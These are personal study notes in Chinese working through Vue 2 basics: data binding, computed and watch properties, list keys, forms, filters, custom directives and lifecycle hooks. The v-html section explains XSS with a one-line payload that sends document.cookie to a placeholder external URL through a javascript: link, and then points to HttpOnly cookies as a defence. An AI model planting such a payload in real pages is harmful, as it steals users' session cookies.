## 学习路径

1. vue 基础
2. vue-cli
3. vue-router
4. vuex
5. element-ui
6. vue3

# 20230628

## vue 简介

1. 构建用户界面+渐进式+JavaScript 框架
2. 自底向上+轻量小巧+插件库
3. Angular+尤雨溪+vue 2.0 Ghost in the Shell+vue 3.0 One Piece
4. 特点
   1. 组件化+复用率高+好维护
      - 封装成.vue 文件格式，包括 html+css+js
   2. 声明式编码，与命令式编码相反
      - 无需直接操作 DOM
   3. 虚拟 dom+diff 算法，复用 dom 节点
      - 数据=》虚拟 dom=》页面真实 dom
5. 前置知识
   1. ES6 语法规范（解构赋值、模板字符串、箭头函数）
   2. ES6 模块化（默认暴露、分别暴露、统一暴露、import?、sport?）
   3. 包管理器（npm、yarn、cnpm）
   4. 原型、原型链（重点）
   5. 数组常用方法（过滤、加工、筛选最值）
   6. axios
   7. promise
6. vue 官网
   1. vue.js 互动教程（直接上手尝试）+示例+演练场
   2. vue2 教程+API（字典）+风格指南+cookbook（技巧）
   3. vue2 工具
      1. Devtools
      2. Vue CLI 脚手架
      3. Vue Loader
   4. vue2 核心插件
      1. Vue Router
      2. VueX
      3. Vue 服务端渲染
   5. Awesome vue+浏览和 vue 相关的包（官方整理的比较好的 Vue 周边库
      1. element-ui 饿了么团队出的
      2. 同样 react 相关有 redux+react-router
7. 安装 Vue
   1. script-src-CDN 加速更快
   2. 开发版本-包含警告，生产版-压缩
8. Vue.config 配置文件
   1. productionTip：设置为 false 以阻止 vue 在启动时生成生产提示。
9. shift+f5 强制刷新
10. live server 插件
    1. 打开页面+本机 5500 端口内置服务器+文件夹下内容作为根资源
11. script 引入 Vue 会默认请求 ico
    1. 必须要有 ico，没有就会报错，直接在根路径下即可
    2. 强制刷新 shift+f5，才会重复请求 favicon.ico
12. new Vue()只传一个参数，而且这个参数是配置对象
    1. 配置对象里面的 key 是不能随意修改的
    2. key 有哪些
       - el+当前 Vue 实例为哪个容器服务+通常为 css 选择器字符串+可以是 document.getElementById('idname')+选择器找到多个容器只能正常解析第一个+多个选择器找到同一个容器后者报错+即选择器与 Vue 实例一一对应+Vue 实例的手下时组件？
       - data+是对象+Vue 实例中 el 所指定容器保存的动态变化的量+html 里面插**值**语法{{}}分隔符+不是对象不是解构赋值+暂时写成对象+组件时写成函数+{{}}里面只能是 js 表达式不能是 js 代码/语句
    3. 真是开发中只有一个 Vue 实例，并配合组件使用
13. js 表达式：一个表达式对应一个值，可以放在任何需要值的地方
14. Vue 的开发者工具
    1. Console 和 Sources 栏的 Vue
    2. 创建了 Vue 实例之后，点击靶标，之后就会有<Root>和 data
    3. root 代表的就是 Vue 实例，根，与 html 里面的无关
    4. 可以直接在里面更新并保存

# 20230703

## vue 版本语法

1. 用开发版本，会有更详细的解析
   - 不用 new，就不是 vue 的实例
2. 插值语法？指令语法
   1. 指令语法
      - 让跳转地址变成动态 href="网址"=》v-bind:href="url"
      - 引号里面的内容 url 变成 js 变成表达式执行
      - v-bind 可以指定任何属性
      - v-bind:**简写**成:
   2. 插值语法和指令语法使用场景
      - 插值语法通常用于指定标签体内容
      - 指令语法通常用于指定标签内容，标签属性\标签体内容\绑定事件
   3. vue 的实例 data 用层级，从而有同样的属性名

## 数据绑定

1. 单向数据绑定和双向数据绑定
   - input 输入框变了，但是 vue 里面的 data 没有同步改变？
   - v-bind 是单向数据绑定,只能 vue 的 data 绑 input 的 value
   - v-model 是双向数据绑定，vue 的 data 绑 input 的 value 同时 input 的 value 绑 vue 的 data；同一个 data 属性对应多个 dom 元素
   - 不是所有属性都有 v-model 属性；只能应用在表单类元素\输入类元素；input|select|checkbox|radio；**v-model 是对 value 绑定**；v-model:value **简写**为 v-model

## el 和 data 的两种写法

1. 将 vue 实例赋值给 const 变量，输出的是 vue 实例而不是这个构造函数
2. 带$符的属性和方法是给程序员用的，v.**proto**或者 vue.prototype 里面
3. 用 v.$mount('#root')的方法设置 el，可以实现过一段时间再关联 vue 实例和容器
   - mount 挂载
4. data 有两种写法，对象式和函数式，函数式必须有返回值
   - **用组件时，必须要用函数式**
   - data 函数里面的 this 是 vue 实例
   - data 函数不能是箭头函数
   - data:function(){}或者 data(){}

## MVVM 模型

1. M-model-对应 data 中的数据，V-view-模板/页面/dom，VM-view model-Vue 实例对象/dom 事件监听/数据绑定
2. 数据代理？**就是会隐藏**

   - 插值表达式可以写 Vue 实例的所有属性，直接写$options 即可，不用写 vm.
   - Object.defineProperty 方法，给对象添加/定义属性；传三个参数对象+属性名+配置项对象$options；生成的是浅色的属性不可以被枚举+不参与遍历；不能用 Objects.kes(对象名)+for...in；在$options 中加一个属性 enumerabl 为 true；不能修改；在$options中添加 writable 为 true；不能被删掉；在$options 中添加 configurable 为 true；对象的属性值是变量，变量更改，但是属性值并不随之改变；在$options 中添加 get 函数，get:function(){return xx}或者 get(){}，每次访问这个对象，都会触发 get 函数的调用，返回这个变量值，也就是随着变量的改变属性值改变；同样的 set(){number = value
     }类似，修改对象里面的属性值，变量随之改变
   - 通过一个对象，代理对另一个对象中属性的读写操作
   - ```js
     let obj = { x: 100 }
     let obj2 = { y: 200 }

     Object.defineProperty(obj2, "x", {
       get() {
         return obj.x
       },
       set(value) {
         obj.x = value
       },
     })
     ```

     如果进行 obj2.x = 300，则 value 就是 300，就会将 obj 的 x 属性赋值为 300

   - 数据代理为了双向绑定一致性，动态输出到 html
   - 数据代理就是写到 data 里面的属性，都可以通过 Vue 实例 vm 获取，vm 里面的数据来自\_data，\_data 里面的数据来自 data

3. \_data 与 data？
   - 数据劫持？
     - 用于在访问或修改对象的属性时进行拦截和控制
     - 与响应式编程和观察者模式结合使用，用于实现数据的自动更新和事件的触发
     - 当对象的属性被访问时，getter 方法会被调用，并可以在这里进行一些额外的处理，比如触发事件、进行依赖追踪等。当属性被修改时，setter 方法会被调用，并可以在这里进行验证、数据转换、更新其他相关属性等操作
     - 通过下划线\_来调用属性，约定该属性为私有属性
     - 把原本的 data 变成有 getter 和 setter 格式
   - https://www.bilibili.com/video/BV1Zy4y1K7SH/?p=13&spm_id_from=pageDriver&vd_source=6ff58b8d064ba5e47281f9dd5e6cb253 这个视频看不懂，什么 vm.\_data.name 和 vm.name
   - 把文件复制到根目录？把 vm.\_data 里面的数据，复制到 vm 里面一份
4. v-on:click=""
   - v-on 表示当什么时候，click 是点击
   - ""是回调函数，这个回调函数的定义必须写到 Vue 实例里面，看不到外面定义的
   - Vue 实例里面这么写：methods:{functionName(只能一个参数事件对象){}}
     - 这个 function 里面的 this 还是 Vue 实例
   - v-on:click="functionName(aa)"这样传参数，传参就加小括号，不传参就不加
   - 传了参也不会没有 event，通过 v-on:click="functionName(aa,$event)占位
   - v-on:click**简写**为@click，也就是任何事件都用@来指定函数
5. 只有配置在 data 里面的东西，才会做数据劫持和数据代理
6. data 是定义组件中的响应式数据的方法，而\_data 是包含这些数据的实际对象。我们应该使用 data 来定义数据，并通过 this 访问它们；\_data 是 Vue 内部使用的属性，一般情况下我们不需要直接使用它。

## 事件修饰符

1. @事件.prevent，来组织默认事件，如表单提交时阻止页面刷新
2. @事件.stop，来组织事件冒泡，不在父元素传播
3. @事件.once，使事件只触发一次
4. @事件.capture, 使用事件的捕获模式+由外往内
5. @事件.self，只有 event.target 是当前操作的元素时才触发事件，不包括子元素
6. @事件.passive，时间的默认行为立即执行，无需等待事件回调函数执行完毕；移动端用的多；**指示事件监听器永远不会调用？**
7. 滚动事件：scroll+wheel
8. **简写形式**事件修饰符可以连写，但是按照顺序
9. 指定事件的回调函数@事件名="函数名()"
   - 必须要加括号调用！

## 键盘事件

1. Vue 常见事件别名，@keyup.enter，enter+delete+esc+space+tab+up+down+left+right
2. key：Enter（更推荐使用）对应 keyCode：13
3. 按下大小写触发事件，@keyup.capslock=""
4. tab 键配合 keydown 使用，因为切换走了焦点，还有 control alt shift win 这四个系统修时间，这四个配合 keyup 按下的同时按下其他键随后释放其他才会触发，这四个配合 keydown 正常触发
5. 使用案件名称而不是用 keyCode 指定案件
   - 可以自定义别名案件 Vue.config.keyCodes.huiche = 13
6. 通过连写，设置键盘连按才能触发事件，@keyup.ctrl.y=""

## 计算属性

1. 联动效果
   1. 用插值语法
   2. 用 methods
   3. 用计算属性:data 里面*不要*这个声明计算属性，computed 里面写新的计算属性
   4. 用 watch：data 里面*要*这个声明计算属性，watch 里面写已有属性函数并更新新属性
2. 想要 methods 里面的函数的返回值，必须要调用也就是用小括号，没有小括号展示整个函数，每个属性都属于 data
3. 计算属性，在已有的属性上进行加工计算生成新的属性
   - 属性和计算属性分开放，属性在 data 里面，计算属性在 computed 里面，也是对象的形式
   - 计算属性里面定义 get 函数，点击获取这个计算属性之后，get 里面的操作才会执行、
   - get 函数里面的 this 就是 Vue 实例
   - 计算属性有缓存，get 会在初次读取时调用，或者在所依赖的数据发生变化时
   - data 和 methods 里面写啥 Vue 实例里面就是啥，computed 自动找到 get 自动调用 get，拿到返回值放到这个属性里
   - set 函数响应计算属性的修改，且 set 中要引起计算时依赖的数据发生变化
4. **简写方式**
   - 计算属性名:{get(){get 函数内容},set(){set 函数内容}}=》计算属性名:function(){get 函数内容}=》计算属性名(){get 函数内容}

## 监视属性-侦听属性

1. methods 里面的方法如果简单，可以直接在事件中写，但是必须在 Vue 实例中，或者 Vue 原型中，但是 window 的一些方法，都没有
2. 实例里面写 watch:{被监视的属性:{immediate:true,handler(newValue,oldValue){处理语句}}}
   - immediate:true 表示还没有改变的时候，初始就调用一次这个 handler
   - 只能在写 handler 的时候同时配置 immediate
3. Vue 实例.$watch('属性名',{如上配置对象})
4. 监视属性变化时，回调函数 handler 自动调用
5. 在 Vue 实例中，和 data 平级
6. 被监视的属性{handler(xx,yy){}}**简写**为被监视的属性(xx,yy){}
7. 如果只有一个形参，就是 newValue

### 深度监视

1. 监视多级结构中某个属性的变化：在 watch 中指定'numbers.a'，监视 data 里面的对象的属性
2. 监视多级结构中所有属性的变化：在 watch 中指定 deep:true
3. **简写形式**（只有 handler 时）
   - watch:{属性(newValue,oldValue){}}
   - vm.$watch('属性',function(newValue,oldValue){}) + 不能箭头函数
4. 所有 Vue 所管理的函数都用普通函数
5. watch 可以延迟执行实现异步任务，而 computed 不行
6. 定时器的回调函数+ajax 的回调函数+Promise 的回调函数不是被 Vue 所管理的函数，使用箭头函数指向 Vue 实例

## class 和 style 绑定

0. 两种情形
   1. 样式类名不确定
   2. 样式个数不确定
   3. 样式类名和个数均不确定
   4. 样式类名和个数均确定，但需要动态确定是否使用
1. 通过在标签内写@事件="事件的回调函数名"，绑定事件
2. Vue 实例中不再使用原生 JS 的 document.xxx 来获取 DOM 元素
3. :class="表达式" 表达式对应写在 Vue 实例的 data 里面
   - 变化的样式用绑定的形式写
   - :是 v-bind:的简写
4. 绑定 class 样式的字符串写法，适用于类名不确定，需要动态指定的情形
5. 数组写法
   - 把所有的样式写在数组里面，数组作为 Vue 实例中 data 对象的属性值
   - 可以是用随机函数选择，也可以是随机添加样式
   - shift 是移除数组里面的第一个元素，pop 是移除数组中最后一个元素
6. 内联样式
   1. 对象写法
      - 写成对象的形式，键值对{}，:style="data 对象的属性名"
      - data 对象的属性名:{fontSize:fsize+'px'}
      - 驼峰命名法
   2. 数组写法
      - 写成数组的形式，[]，:style="[data 对象的属性名 1,data 对象的属性名 2]"
      - data 对象的属性:{data 对象的属性 1,data 对象的属性 2}
      - 数组中必须是样式对象，样式对象中的键必须是存在的样式 ming

## 条件渲染

1. 条件渲染指令
   1. v-if|if-else|v-else-if
      - 不显示是 html 结构会去除
      - v-else 不要写条件
      - 相互元素之间不能打断，只能是连续
      - 低切换频率推荐使用
   2. v-show
      - 底层实现就是设置 display::none;
      - 本身 html 结构不会去除
      - 高切换频率推荐使用
2. template 模板双标签不影响结构
   - template 包裹需要同步渲染的结构
   - 只能配合 v-if 使用
3. v-if，元素可能无法获取到，v-show 一定可以获取到

## 列表渲染

1. JS 里面一旦有顺序，就用数组
2. 主动给数组对象添加唯一标识
3. v-for="person in persons"
   - 类似于 for...in 遍历
   - 写在 li 标签里面，从而 li 只需要写一个
   - person 是 li 标签体中可以使用的形参
4. v-for="(p,index) in persons"
   - ()可以没有
   - 可以有两个形参
   - 可以:key="index"，因为 index 唯一
5. key 唯一标识
   - 格式为 :key="唯一标识"
   - 使用 key 时，它会基于 key 的变化重新排列元素顺序，并且会移除 key 不存在的元素
   - 有相同父元素的子元素必须有独特的 key，重复的 key 会造成渲染
   - 替换而不是修改
   - 应用
     - 完整地触发组件的生命周期钩子
     - 触发过渡
6. in 和 of 都可以；可以遍历数组也可以遍历对象和字符串
   - of 对象的话，获取两个形参，分别值和键，key 不要冲突
   - 字符串的话，获取两个形参，分别是字符串的字符和索引
7. (a,b) of 5 指定循环次数
   - a 是从 1 开始的数，b 是 0 开始的索引值

### key

1. unshift 在数组开头添加元素
   - 此时将 index 作为 key 出问题了
2. 所有元素的 key 都被 Vue 征用了，不会显示
3. 虚拟 dom 对比算法 diff
4. 遍历列表时 key 的作用
5. 流程
   1. Vue 将初始数据生成虚拟 DOM，虚拟 DOM 必须要有 key
   2. 虚拟 DOM 也叫 Vnode
   3. 再将虚拟 DOM 转换成真实 DOM
   4. 用户操作真实 DOM
   5. 根据新数据生成虚拟 DOM
   6. 如果在数组开头插入，那么新插入的数据的 key 就是 index 值，即 0
   7. **依赖 key，将两次虚拟 DOM 使用对比算法进行对比**
      - 首先新的虚拟 DOM，按顺序取出第一个，找 key，找原来虚拟 DOM 中同样的 key 的项
      - 对比里面的内容，文本节点对比，元素属性对比（不是真实 dom 对比，不考虑 input 输入的 value 值）
        - 如果不一致，就不能复用，新虚拟 DOM 生成新的真实 DOM
        - 如果一直，就复用，直接复用之前生成的真实 DOM
      - 如果没有相同的 key 的项，直接由新虚拟 DOM 生成新真实 DOM
6. index 作为 key 有问题
   - 对数据进行逆序操作，会产生没必要的真实 DOM 更新，效率低
   - 还包括输入类 DOM，会导致界面出错
   - 只用于渲染，可以用 index

## 列表过滤（模糊搜索）

1. 流程
2. 收集用户输入数据，随着输入收集，用 v-model，双向绑定
3. 拿着关键词去列表里面过滤，在用户输入关键词改变时就要进行过滤，用 watch？用计算属性写？
   - computed 能实现的 watch 都能实现
   - watch 和 data 是平级的
4. 判断字符串里面是否有指定的字符？
   - indexOf 方法
   - 不包含返回-1，包含返回索引值
   - **任何字符串判断空字符串的 index，总返回 0**
5. filter 方法不更改原数组，返回全新的数组
6. 应该在原数组的基础上过滤，保留并返回过滤后的新数组
   - 在 Vue 实例中添加一个数组，初始值为原数组
7. //#region 和//#endregion 折叠中间区域
8. 计算属性中的函数要有一个返回值
   - 计算属性依赖于 Vue 实例中的 keyWord
   - 计算属性本身就会在两个时候调用，初始以及改变时
9. computed 和 watch 都能实现的时候，优先 computed

### 列表排序

1. 设定排序的标志，sortType 初始为 0，注释 0 原顺序|1 降序|2 升序
2. 在 computed 的 filPersons 函数里面先暂存过滤后的数组，再判断是否需要排序
3. sort 方法，返回值为正交换位置，(a,b)=>a-b 表示升序，(a,b)=>b-a 表示降序
4. 原顺序怎么回去的？因为原数据没有更改

## Vue 监测数据改变的原理

1. Vue 默认就有一个监视，不是 watch，watch 是给程序员用的监视
2. 两种修改方法？直接将对象赋值进去|一个个属性赋值进去
   - 第一种方式，先点开 Vue 开发工具，Vue 检测不到信息改变
   - 但是先修改，再点开 Vue 开发工具，会呈现信息改变
3. 通过 getter 和 setter 监测属性的改变
4. 底层有构造函数 Observer，不直接写 get 和 set，避免内存溢出
   1. 汇总对象中所有属性，形成一个数组，通过 Object.keys(obj)
   2. 遍历
      - keys.forEach()
      - 在里面对每一个属性名，调用 Object.defineProperty(this,属性名,{get(){},set(val){}})
5. Vue 的考虑
   1. 对象内嵌套对象，数组内嵌套对象，内层属性也有 getter 和 setter
   2. 可以直接 vm.属性名而不是 vm.\_data.属性名
6. Vue 不展示 undefined 的值
   - a.b 中 a 不存在，会报错
   - a.b 中 a 存在，b 不存在，显示为空
7. 后面添加的属性，如何实现响应式功能
   1. Vue.set(target,key,val)，分别是向那个对象上添加属性，键，值
   2. 或者 vm.$set(target,key,val)或者this.$set(target,key,val)
   3. 不能直接 vm.\_data.xx = yy 或者 vm.data.xx = yy
   4. 只能给 data 里面的某一个对象追加属性，不能给 data 本身追加属性，也就是 Vue 实例本身，即 target 不能是 vm 本身，或者 Vue 实例的跟数据对象\_data
   5. 对象里面的可以生成 setter 和 getter，可以动态更新
   6. **数组通过索引的方式修改，不会动态更新**，用那七个数组方法，会更新
      - 通过索引的方式获取的是一个对象，要更新这个对象的属性，那么正常更新
      - 通过索引的方式获取的是一个数组，更新数组元素，不能正常更新
        - 用七个数组方法中的方法进行所需操作
        - 用 set（三种）
      - push|pop|splice|shift|unshift|sort|reverse
        - filter 会生成新的数组，往往用新的数组替换
      - 用到了包装技术
      - 数组实例的 push 是原型对象的 push，arr.push === Array.prototype.push(true)
      - vm.data 里面属性名.push === Array.prototype.push(false)
        - 有 push
        - 也会解析并视图更新
8. **所有不是由 Vue 控制的回调，尽量写成箭头函数的形式**

## vm.\_data

1. 先加工 data
   - 加工了 data，就能做响应式了，就是数据和页面同步改变
   - 就能实现对象里面属性的监视
2. 后 vm.\_data=data
3. 响应式 setter 就会重新解析模板

## 收集表单数据

1. 一般不用 form 的 action 属性，而用 ajax，可以页面不刷新跳转
2. 在 form 表单中，button 自带提交
   - 给 button 绑定提交事件，阻止默认行为
   - 给 form 绑定提交时间，阻止默认行为@submit.prevent=""
3. 单选框 radio 如何在 Vue 实例中获取值
   - 给标签设置 value 值，对应选项，v-model 获取 value 值
4. 复选框 checkbox 如何在 Vue 实例中获取值
   - 本身获取的是 checked 值，true 或 false 是否勾选
   - 同时将 v-model 的值写成数组（空），并设定 value 值，首选的就是 value 组成的数组
   - 是否勾选，单个按钮，完全可以只获取 boolean 值
5. select 框
   - 给 option 标签设置 value 值
6. 不建议直接访问\_data，把所有信息放到一个对象里面更好
7. v-model 的修饰符
   1. number 修饰符
      - v-model.number 直接将收集的以数字的形式保存
      - input 的 number 类别是只能输入数字
   2. lazy 修饰符
      - 输入结束失去焦点才会收集
   3. trim 修饰符
      - 去除前后空格

## 过滤器

1. filters 配置项，里面写函数，在插值表达式部分写 property | 过滤器名称
   - filters:{过滤器名称(value){return }}
   - 这个 value 就是这个 property
   - 可以过滤器名称(参数)传参数，property 总会默认传入，给这个传入的参数直接设定初始值，初始值就是没有参数传入的时候的返回值，传入了参数自然按照参数的格式
2. 多个过滤器之间可以串联
   - property | 过滤器名称 1 | 过滤器名称 2
   - 按顺序传
3. 局部过滤器——写在 Vue 实例中
4. 全局过滤器
   - `Vue.filter('过滤器名称'，function(value){return})`
   - 必须写在 Vue 实例创建之间写好
   - 全局过滤器是 filter，局部过滤器是 filters
5. 组件是微型的 Vue 实例？
6. 除了插值语法中使用，还可以在哪里使用？
   - 插值语法是文本节点内
   - 还可以在标签的 attribute 上使用，:x="property | 过滤器名称"
   - 只能是 v-bind，v-model 不能使用
7. 应用
   - 过滤器适合简单处理
   - 如电商网站的价格 1999 写成 1,999
8. 过滤器不改变原始数据

## 内置指令-不常见

0. 常见指令
   - v-bind 单向绑定解析表达式，简写:
   - v-model 双向数据绑定
   - v-for 遍历数组/对象/字符串
   - v-on 绑定事件监听，简写@
   - v-if 条件渲染，动态控制节点是否存在
   - v-else 条件渲染，动态控制节点是否存在
   - v-show 条件渲染，动态控制节点是否显示
1. v-text
   - 向其所在标签插入文本
   - 不如插值语法更灵活
   - 文本节点内容只会直接被替换
   - 不会解析 html
2. v-html
   - 涉及 Node.js 里面的 cookie 原理
     - cookie 本质是 json 字符串
     - cookie 由浏览器保存
     - cookie 不能跨浏览器读取
     - chrome 里面是 application-cookie，firefox 里面是存储-cookie
     - 可以在 console 里面获取 cookie
       - document.cookie
     - a 标签中 `href=javascript:location.href="网址?"+document.cookie`
     - 勾选 HttpOnly，除了 http 协议，都不能获取，也就是 js 无法获取
   - xss 安全性问题-冒充用户之手
   - 只能在可信的内容上使用 v-html，不要再用户提交的内容上使用 v-html
3. v-cloak
   - 写服务器？:server.js，命令 node server，延时获取 Vue.js
   - js 阻塞？讲 html 结构的时候讲过
   - 不能出现闪现效果，script 写在 body 最后面容易出现
   - v-cloak 没有取值，Vue.js 导入之后，这个属性就会消失
   - 属性选择器
     ```css
     [v-cloak] {
       display: none;
     }
     ```
   - 解决的问题：网速慢时，让未经解析的模板不会跑到页面上去
4. v-once
   - v-once 没有取值
   - 只执行一次
   - 初次动态渲染，后续就是静态内容
   - 作用：性能优化
   - 不要和事件修饰符弄混：prevent|stop|once|capture|self|passive
5. v-pre
   - 跳过其所在节点的编译过程，插值语法、指令语法无效
   - 作用：给不需要这些语法的语句加快编译

## 自定义指令

1. Vue 实例中，和 data 同级的 directives 对象，里面是指令名
   - 格式一：key 和 value 对的形式，`指令名:{k1:v1,k2:v2}`，可以处理细节问题
   - 格式二：直接写成函数指令名:function(){}，简写为指令名(){}
2. 函数形式，传入参数，第一个 element 是真实 dom，第二个 binding 是对象`{expression,value,name,rawName}`
   - element 是指令所在的标签
   - expression 是赋值给指令的 data 里面的 property
   - value 是赋值给指令的 data 里面 property 的 property 值
   - name 是指定的指令名，rawName 是使用时要写的指令名
3. 自定义指令（写成函数时）什么时候被调用？
   1. 指令与元素建立联系时/绑定时
   2. 指令所在的模板被重新解析时，哪怕指令内用到的数据没有被修改
      - 模板就是 Vue 实例所指的 DOM 元素
      - 只要这个 Vue 实例里面的 data 数据改变，就会被重新解析，里面的指令就会被调用
4. 指令语法的功能
   1. 解析标签属性
   2. 解析标签体内容
   3. 解析绑定事件
   4. ......
5. 直接把自定义指令写成函数的形式，想要一上来就获取 input 的焦点有问题
   - 需要分三个步骤写三个函数
     1. 先指令与元素绑定 bind
        - property 值赋值给元素
     2. 后指令所在元素插入页面 inserted
        - 获取焦点
     3. 最后指令所在模板被重新解析 update
        - property 值赋值给元素
   - bind 和 update 函数内容往往重复，其实就要加 inserted
   - 生命周期钩子，Vue 会在不同的时候，调用不同的函数
6. 除了动态参数里面不能写大写字母，避免使用大写字符来命名键名，因为浏览器会把 attribute 名全部强制转为小写；还要避免自定义指令里面用大写字母，可以写成 v-big-number，然后 directives 里面写成`'big-number'(element,binding):{}`
7. 所有指令函数里面的 this 都是 window，不是 vm
   - 任何一个指令的函数内部的 this 都是 window
8. 写在 directives 里面的指令，都是局部指令，只能给所绑定的 dom 元素及其子代使用
9. 全局指令，Vue.directive，用两个参数传入，分别是指令名称和一对象的方式传入的三个函数
   - 没有 s
10. 总有两种写法

- 局部指令：指令名:配置对象| 指令名:回调函数
- 全局指令：(指令名,配置对象)|(指令名,回调函数)

## 生命周期

### chapter one

1. 内联样式，动态绑定要:，一组组的样式要写成对象的格式，opacity:opacity 可以写成这样，两个 opacity 含义不同，前者是 css 属性名，后者是 Vue 实例的 property，但是因为重名，所以可以写成对象的简写形式，也就是只要一个 opacity
2. window.onload(()=>{})这里面写的操作，就是页面加载完后自动执行的操作
3. 定时器写在 methods 里面无法实现透明度渐减的功能
4. mounted 函数，与 data 同级
   - Vue 完成模板的解析，并把真实的 DOM 元素放入页面之后，也就是**挂载**完毕之后，就会调用 mounted，也就是 mounted 只会调用一次
   - mounted 可以实现透明度渐减这一功能
   - 关键时刻调用关键函数
5. 生命周期就是各个特殊事件点调用的各个特殊函数
   - 各个特殊函数的里面的 this 就是 vm
   - 所以在各个特殊函数里面调用 setInterval 等函数的时候，要用箭头函数
6. 生命周期=生命周期回调函数=生命周期函数=生命周期钩子
7. 生命周期函数的名字不可更改，但是函数内容由我们自己定义
8. 生命周期中的 this 指向 vm 或者组件实例对象
9. 透明度渐渐实现
   1. 引入 vue.min.js 文件`<script type="text/javascript" src="./vue/js/vue.min.js"></script>`
      - 使用 script 标签的方式引入
   2. 设置动态绑定的 opacity 样式<h1 id="opaci" :style="{opacity}">透明度渐减的效果</h1>
      - 注意一：v-bind:style，赋值给 style 的是字符串的形式
      - 注意二：里面写成对象的形式，opacity:opacity 简写为 opacity
      - 注意三：opacity 后者为 data 中的 key
   3. 在 mouted 中使用 setInterval 函数让 opacity 渐减，并在<=0 时恢复为 1
      ```js
      mounted() {
                setInterval(() => {
                    this.opacity -= 0.01
                    if (this.opacity <= 0) {
                        this.opacity = 1
                    }
                }, 10)
            },
      ```

### chapter two

1. 理解生命周期解析图
2. template 的作用；vm.$el()的影响；
   - 两种 template 的区别，替换？
   - 一种是直接在 body 里面写完，挂载在一个标签上，里面写满
   - 另一种里面为空，在 Vue 实例中写 template:''或者``
     - template 里面注意里面只能有一个根节点，不能是 template
     - 而且是将``或者''里面直接替换掉挂载的那个标签
3. 顺序是-直接在 Vue 实例里面，和 data 同级
   - beforeCreate()
   - created()
   - beforeMount()
   - **mounted()**
     - 开启定时器，消息订阅
   - beforeUpdate()
   - updated()
   - **beforeDestroy()**
     - 对数据的操作不会再触发更新
     - 进入了 beforeDestroy 不会再回到 beforeUpdate 了
   - destroyed()——React 没有这个
     - 如果没有在销毁之前打开 Vue 开发者工具，直接看不到 vm
     - 之前打开过，vm 还看得到
4. 学会用 debugger
5. 组件实例对象 = 微型 vm
6. 自定义事件是什么？
   - vm.$destory 销毁一个实例之后
   - 会清理它与其它实例的连接，同时解绑全部指令和自定义事件监听器（原生事件监听还存在）
7. 梳理
   1. Vue 里的生命周期钩子之间共用属性
      - 不同作用域，通过 this.xxx 实现
   2. 控制透明度渐减的实现发现问题
      1. 为什么只能帮顶外层的标签，绑定当前标签并改变透明度时，没有效果？
         1. 有错误的效果
            ```html
            <!-- Vue实例挂载在h1上 -->
            <h1 id="opaci" :style="{opacity}">透明度渐减的效果</h1>
            <button @click="stop">带你我停止变化</button>
            <button v-on:click="opacity = 1">透明度设置为1</button>
            ```
         2. 正确实现的效果
            ```html
            <div id="opaci">
              <h1 :style="{opacity}">透明度渐减的效果</h1>
              <button @click="stop">带你我停止变化</button>
              <button v-on:click="opacity = 1">透明度设置为1</button>
            </div>
            ```
      2. 理解 Vue 实例挂载到的就是模板或者组件定义的自定义元素
         - 挂载的 DOM 元素实际上是 Vue 实例的根元素，该元素及其子元素将成为 Vue 实例所管理的视图。
         - 但是只能根元素下的 dom 元素动态更新
